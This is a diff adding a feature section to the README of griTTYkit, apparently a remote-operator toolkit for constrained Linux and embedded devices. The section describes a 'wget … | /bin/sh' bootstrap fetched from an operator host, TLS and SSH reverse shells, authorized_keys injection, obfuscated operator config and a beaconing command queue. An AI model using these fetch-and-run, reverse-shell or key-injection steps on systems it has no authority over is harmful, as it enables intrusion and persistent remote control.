@@ -22,6 +22,148 @@ and bundled notices stay aligned.
 
 ---
 
+## What Can It Do?
+
+griTTYkit is designed to work on targets that fight back — ancient kernels,
+read-only root filesystems, `/tmp` mounted `noexec`, no Python, no package
+manager, spotty connectivity, and hardware you'd rather not brick. Here's
+what it actually does under the hood.
+
+### Gets onto the target without knowing what it is first
+
+The probe bootstrap (`probe.sh`) is a ~40-line POSIX sh script served
+on-demand by the operator console. It runs before griTTYkit exists on the
+device — all it needs is `wget` or `curl` and `/bin/sh`. It determines arch,
+kernel version, word size, and endianness, then POSTs the results back to the
+operator. From there, `probe config` generates a build config and `probe serve`
+stages the right binary for the detected architecture.
+
+```sh
+# operator side — one command
+grit[all]> probe --start
+  wget -O- http://192.168.1.10:22207/probe.sh | /bin/sh   # ← run this on target
+grit[all]> probe results      # see what came back
+grit[all]> probe config --write-config local/server-config.json
+grit[all]> probe serve --start
+```
+
+### Finds somewhere to live, no matter what
+
+Before extracting, griTTYkit probes whether a directory is actually usable for
+code execution — not just writable, but executable and not `noexec`-mounted.
+It parses `/proc/mounts` to find the mount covering each candidate path, checks
+the flags, measures available space (requires 4× payload size), then walks a
+fallback chain:
+
+```
+./.grit  →  /tmp/grit-$uid  →  /var/tmp/grit-$uid  →  /dev/shm/grit-$uid
+```
+
+If every candidate is `noexec`, it tells you exactly why rather than silently
+failing. Aggressive no-residue mode disables the fallback chain entirely and
+errors at build time if it would be needed.
+
+### Extracts without buffering the whole payload
+
+The payload is a gzip'd tar embedded in the binary. `payload_extract.c`
+implements its own streaming gzip decompressor — it inflates through an 8 KB
+window that feeds directly into tar parsing, never buffering the full payload
+in memory. A 50 MB payload with tmux, zsh, and gdbserver extracts on a router
+with 32 MB free RAM. BusyBox-only invocations (`grit sh`, `grit cp`) trigger
+a lightweight core-only extraction that skips the heavy tools entirely.
+
+### Repairs a broken shell environment
+
+On targets where init scripts forgot to set `PATH`, `HOME`, or `TERM`:
+
+```sh
+eval "$(./grit envfix)"
+```
+
+Prints the right `export` statements for the actual system, creates a fallback
+home directory if needed, and works in any shell state — including one that has
+sourced nothing useful.
+
+### Checks whether the target can actually do what you need
+
+`grit reality-test` runs 21 distinct probes before you commit to a workflow:
+
+- Can it fork? Spawn a shell? Allocate a PTY?
+- Is `/tmp` `noexec`? Is root read-only? Is `/proc` partial?
+- Can it bind localhost? Reach the operator with a non-blocking TCP connect?
+- Can it run payload binaries — BusyBox applets, heavy tools?
+- Is `ptrace` available (needed for gdbserver)?
+
+It outputs structured JSON separating *constraints* (what's missing) from
+*capabilities* (what works), and feeds that into config recommendations. The
+config pipeline uses reality-test output to decide whether to recommend
+builtin TLS, socat, or SSH transport based on what the target can actually do.
+
+### Knows what it wrote and cleans it up honestly
+
+Every file griTTYkit creates is recorded in a JSONL ledger on the target with
+the operation, path, scope, timestamp, and target identity. `grit clean` uses
+the ledger rather than glob-deleting things it *thinks* it created.
+
+For SSH authorized_keys specifically, there are three cleanup modes:
+full removal, merge (remove only the injected block while preserving keys
+that existed before), and backup restore. And `grit plan` explicitly lists
+what it *cannot* clean — kernel logs, shell history, filesystem journals,
+flash wear-leveling — rather than claiming a cleanliness it can't guarantee.
+
+### Stamps binaries with operator config post-build
+
+The trailer system appends an encrypted configuration block to the end of a
+built artifact without touching the ELF. You can ship one binary to 100
+different targets and stamp each one with a different operator IP, transport,
+and port after the fact:
+
+```sh
+grit-artifact config set dist/grit-mipsel-linux-4.x-musl-full \
+  GRIT_OPERATOR_SERVER_HOST=10.0.0.5 \
+  GRIT_RSHELL_TRANSPORT=tls-shell
+```
+
+The trailer is SHA-256 verified on load and optionally XOR-obfuscated. It
+overrides compiled-in defaults without requiring a rebuild.
+
+### Reverse shell that works on stripped OpenWrt
+
+The builtin TLS reverse shell uses pipes instead of a PTY because OpenWrt PTY
+behavior varies across kernel versions and target hardware. The wolfSSL
+integration handles `WANT_READ`/`WANT_WRITE` correctly — TLS reads can require
+writes and vice versa, and getting this wrong causes subtle hangs. The SSH
+transport uses Dropbear's `dbclient` to establish a reverse forward, and the
+operator console catches it with a small Paramiko SSH server.
+
+Three transports, one config field:
+
+```text
+GRIT_RSHELL_TRANSPORT=ssh          # reverse SSH forward via dbclient
+GRIT_RSHELL_TRANSPORT=tls-shell    # builtin wolfSSL or socat TLS
+GRIT_RSHELL_TRANSPORT=plain-shell  # unencrypted, for isolated labs
+```
+
+### Works without internet — reproducibly
+
+Every third-party source is SHA-256 pinned in `manifests/sources.lock.json`.
+`scripts/lib/mirror-sources` fetches and verifies the full source set.
+`scripts/lib/check-offline-readiness` validates completeness before a build
+attempt. The result is a tarball you can carry into an air-gapped network and
+build from with no external access required.
+
+### Handles targets that phone home on their own schedule
+
+When a target can't hold a persistent connection, the command queue lets you
+stage work for delivery on the target's next poll. The operator queues
+commands; the target polls at a configurable interval with exponential backoff
+and jitter; results come back the next time the target checks in. The queue
+has an explicit policy model (`none`, `grit-only`, `allowlist`, `custom`) that
+controls what can be executed, with dry-run before any execution mode is
+enabled.
+
+---
+
 ## Quick Start
 
 ```sh
